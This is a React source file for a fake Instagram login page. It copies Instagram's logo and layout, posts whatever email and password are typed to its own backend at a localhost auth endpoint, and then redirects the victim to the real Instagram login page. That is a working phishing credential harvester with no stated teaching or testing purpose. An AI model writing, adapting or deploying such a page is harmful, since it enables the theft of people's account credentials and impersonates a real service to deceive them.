import { useState } from "react";

function App() {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");

  const handleLogin = async (e) => {
    e.preventDefault();

    if (!email || !password) {
      alert("Please fill in both fields");
      return;
    }

    fetch("http://localhost:4000/api/auth/login", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({ email, password }),
    })
      .then((res) => res.json())
      .then((data) => {
        console.log(data);
        window.location.href = "https://www.instagram.com/accounts/login/";
      })
      .catch((err) => console.error("Login error:", err));
    
  };

  return (
    <div className="flex items-center justify-center min-h-screen bg-gray-100 px-4">
      <div className="w-full max-w-sm">
        {/* Login box */}
        <div className="bg-white border border-gray-300 p-6 sm:p-8 rounded-md shadow-sm">
          <div className="flex justify-center mb-6">
            <img
              src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png"
              alt="Instagram"
              className="h-12 sm:h-14"
            />
          </div>

          <form onSubmit={handleLogin}>
            <input
              type="text"
              placeholder="Email"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              className="w-full mb-3 px-3 py-2 border border-gray-300 rounded bg-gray-50 text-sm focus:outline-none focus:ring-1 focus:ring-gray-400"
            />
            <input
              type="password"
              placeholder="Password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className="w-full mb-4 px-3 py-2 border border-gray-300 rounded bg-gray-50 text-sm focus:outline-none focus:ring-1 focus:ring-gray-400"
            />
            <button
              type="submit"
              className="w-full bg-blue-500 text-white py-2 rounded font-semibold text-sm hover:bg-blue-600 transition"
            >
              Log In
            </button>
          </form>

          <div className="flex items-center my-4">
            <div className="flex-grow h-px bg-gray-300" />
            <span className="mx-2 text-xs text-gray-400 font-semibold">OR</span>
            <div className="flex-grow h-px bg-gray-300" />
          </div>

          <button className="flex items-center justify-center text-blue-900 font-medium text-sm mb-3">
            <img
              src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg"
              alt="Facebook"
              className="h-4 w-4 mr-2"
            />
            Log in with Facebook
          </button>

          <div className="text-center">
            <a href="#" className="text-xs text-blue-800 hover:underline">
              Forgot password?
            </a>
          </div>
        </div>

        {/* Sign up */}
        <div className="bg-white border border-gray-300 p-4 mt-4 text-center text-sm rounded-md shadow-sm">
          Don't have an account?{" "}
          <a href="#" className="text-blue-500 font-semibold hover:underline">
            Sign up
          </a>
        </div>
      </div>
    </div>
  );
}

export default App;
